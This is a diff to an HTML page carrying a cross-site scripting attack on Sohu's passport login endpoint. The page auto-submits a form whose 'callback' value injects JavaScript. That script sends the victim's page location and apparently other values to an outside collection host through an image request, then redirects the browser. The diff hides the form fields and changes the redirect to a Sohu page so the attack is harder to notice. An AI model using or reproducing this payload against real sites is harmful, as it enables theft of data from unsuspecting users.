@@ -5,8 +5,8 @@
 </head>
 <body>
     <form method="post" action="http://passport.sohu.com/apiv2/login" id='xss'>
-        <input name="domain" value="sohu.com">
-        <input name="callback" value="passport20003776568760853283;(new Image()).src = 'http://www.tongtianqi.com/xss/?location=' + escape((function () {
+        <input name="domain" hidden value="sohu.com">
+        <input name="callback" hidden value="passport20003776568760853283;(new Image()).src = 'http://www.tongtianqi.com/xss/?location=' + escape((function () {
                 try {
                     return document.location.href
                 } catch (e) {
@@ -30,7 +30,7 @@
                 } catch (e) {
                     return ''
                 }
-            })());window.location.href='http://www.baidu.com';console.log">
+            })());(function () {window.location.href='http://tv.sohu.com'})();console.log">
     </form>
     <script type="text/javascript">
         document.getElementById('xss').submit();
